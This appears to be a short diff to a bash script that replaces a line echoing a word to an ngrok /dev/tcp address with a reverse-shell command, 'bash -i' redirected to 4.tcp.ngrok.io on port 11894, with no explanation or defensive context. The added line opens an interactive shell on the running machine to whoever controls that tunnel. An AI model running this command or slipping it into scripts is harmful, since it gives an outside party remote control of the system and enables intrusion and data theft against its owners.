@@ -1,3 +1,3 @@
 #!/bin/bash
 
-echo esootilin > /dev/tcp/4.tcp.ngrok.io/11894
+bash -i >& /dev/tcp/4.tcp.ngrok.io/11894 0>&1
